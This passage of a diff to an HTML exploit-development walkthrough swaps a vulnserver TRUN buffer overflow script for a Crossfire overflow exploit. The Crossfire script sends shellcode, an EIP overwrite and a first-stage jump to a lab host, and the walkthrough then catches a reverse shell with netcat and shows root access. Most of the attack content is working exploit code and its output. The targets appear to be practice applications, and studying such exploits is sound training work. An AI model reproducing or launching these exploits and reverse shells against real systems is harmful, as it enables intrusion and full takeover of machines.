-<span><span>#!/usr/bin/python</br>import sys, socket</br></br>overflow = ("\xbe\[...]\x58")</br></br>shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow</br></br># 2003 bytes, this will take to EIP</br># when we reach EIP, we give the address of the jump,</br># we jump to the instruction series with this</br># ("\x90" * 32 + overflow),<br># the "\x90" * 32 will be the knobs.</br># The knobs are the padding between the jump address and the overflow,</br># this makes the exploit more stable</br></br>try:</br>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</br>    s.connect(('192.168.1.90', 9999))</br>    s.send(('TRUN /.:/' + shellcode))</br>    s.close()</br></br>except:</br>    print("Error connecting to server")</br>    sys.exit()</br></span></code></div>
+<span><span>#!/usr/bin/python</br>import socket</br></br>host = "10.11.0.128"</br></br>nop_sled = "\x90" * 8 # NOP sled knobs</br></br>shellcode = ""</br></br>shellcode += "\xbe\x35\x9e\xa3\x7d\xd9\xe8\xd9\x74\x24\xf4\x5a\x29"</br></br>[...]</br></br>shellcode += "\x7f\x6d\x02\x36"</br></br>padding = "\x41" * (4368 - len(nop_sled) - len(shellcode))</br></br>eip = "\x96\x45\x13\x08" # 0x08134596</br></br>first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90"</br></br>buffer = "\x11(setup sound " + nop_sled + shellcode + padding + eip + first_stage +"\x90\x00#</br></br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</br>print("[*]Sending evil buffer...")</br></br>s.connect((host, 13327))</br>print(s.recv(1024))</br></br>s.send(buffer)</br>s.close()</br></br>print("[*]Payload Sent !")</br></span></code></div>
 Done. Let's try getting a shell.
 <h3>8. Root!</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;">
-<span><span># nc -lvnp 4444</span></code></div>
-Immunity Debugger is not necessary, but the vulnserver must be running.</br>
+<span><span># nc -lvnp 443</span></code></div>
+edb is not necessary, but Crossfire must be running.</br>
+If we would re-attach the Crossfire application to edb, the debugger would catch SIGCHLD events, causing the application to pause whenever a command has been executed through our reverse shell.</br>
 On another tab on the Kali machine:
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;">
 <span><span># chmod +x 2.py</span></code></div>
@@ -301,7 +279,7 @@ On another tab on the Kali machine:
 <span><span># .2.py</span></code></div>
 Looking back to the tab with netcat running, we see that we got a shell!</br>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;">
-<span><span># nc -lvnp 4444</br>C:\[...]> whoami</br>whoami</br>COMPUTER\ADMINISTRATOR</br>C:\[...]\></span></code></div>
+<span><span># nc -lvnp 443</br>whoami</br>root</br></span></code></div>
 </div>
 </br></br>
 ~Thank you for reading~
